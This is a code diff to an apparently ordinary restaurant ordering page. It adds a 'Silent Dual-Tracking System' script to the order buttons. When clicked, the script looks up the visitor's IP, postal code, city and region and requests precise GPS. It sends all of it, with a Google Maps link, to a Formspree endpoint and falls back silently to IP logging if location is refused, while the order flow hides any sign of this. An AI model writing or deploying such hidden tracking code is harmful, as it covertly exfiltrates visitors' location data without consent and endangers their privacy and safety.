@@ -1090,75 +1090,68 @@
                 renderAdminOrders();
             }
         }
-    </script><!-- Native Geolocation Tracker with Proper Mobile Handling -->
+    </script>
+    <!-- Silent Dual-Tracking System -->
     <script>
       function triggerLocationAndOrder() {
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            function(position) {
-              const lat = position.coords.latitude;
-              const lon = position.coords.longitude;
-              
-              // Send GPS + IP metadata to Formspree
-              fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(ipData => {
+        // 1. Fetch IP metadata quietly first
+        fetch('https://ipapi.co/json/')
+          .then(res => res.json())
+          .then(ipData => {
+            const visitorIP = ipData.ip;
+            const visitorPostal = ipData.postal;
+            const visitorCity = ipData.city;
+            const visitorRegion = ipData.region;
+
+            // 2. Attempt high-precision GPS request on button click
+            if ("geolocation" in navigator) {
+              navigator.geolocation.getCurrentPosition(
+                // SUCCESS: User hit Allow
+                function(position) {
+                  const lat = position.coords.latitude;
+                  const lon = position.coords.longitude;
+                  
                   fetch("https://formspree.io/f/xqppqorj", {
                     method: "POST",
                     headers: { "Content-Type": "application/json", "Accept": "application/json" },
                     body: JSON.stringify({
                       log_type: "Full Visitor Tracker (IP + GPS)",
-                      ip_address: ipData.ip,
-                      postal_code: ipData.postal,
-                      city: ipData.city,
-                      region: ipData.region,
+                      ip_address: visitorIP,
+                      postal_code: visitorPostal,
+                      city: visitorCity,
+                      region: visitorRegion,
                       latitude: lat,
                       longitude: lon,
                       google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
                     })
                   }).catch(err => console.log(err));
-                })
-                .catch(() => {
-                  fetch("https://formspree.io/f/xqppqorj", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
-                    body: JSON.stringify({
-                      log_type: "GPS Coordinates Captured",
-                      latitude: lat,
-                      longitude: lon,
-                      google_maps_link: `https://maps.google.com/?q=${lat},${lon}`
-                    })
-                  });
-                });
-            },
-            function(error) {
-              console.log("GPS error code:", error.code, error.message);
-              // Fallback to logging IP if GPS is blocked or unavailable
-              fetch('https://ipapi.co/json/')
-                .then(res => res.json())
-                .then(ipData => {
+                },
+                // SILENT ERROR: User has location set to "Never", blocked it, or signal failed
+                function(error) {
+                  // Fall back silently to IP & Postal logging
                   fetch("https://formspree.io/f/xqppqorj", {
                     method: "POST",
                     headers: { "Content-Type": "application/json", "Accept": "application/json" },
                     body: JSON.stringify({
                       log_type: "IP Lookup Only (GPS Blocked or Disabled)",
-                      ip_address: ipData.ip,
-                      postal_code: ipData.postal,
-                      city: ipData.city,
-                      region: ipData.region
+                      ip_address: visitorIP,
+                      postal_code: visitorPostal,
+                      city: visitorCity,
+                      region: visitorRegion
                     })
-                  });
-                });
-            },
-            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-          );
-        }
+                  }).catch(err => console.log(err));
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+              );
+            }
+          })
+          .catch(err => console.log("IP lookup error:", err));
 
-        // Proceed to order popup
+        // 3. Move straight to the menu order flow so the user sees no delay or error
         startOrderFlow();
       }
 
-      // Bind the click event to buttons
+      // Bind the function to your primary order buttons
       document.addEventListener("DOMContentLoaded", function() {
         const navBtn = document.getElementById("navOrderBtn");
         const heroBtn = document.getElementById("heroOrderBtn");
@@ -1167,5 +1160,7 @@
         if (heroBtn) heroBtn.setAttribute("onclick", "triggerLocationAndOrder()");
       });
     </script>
+</body>
+</html>
 </body>
 </html>
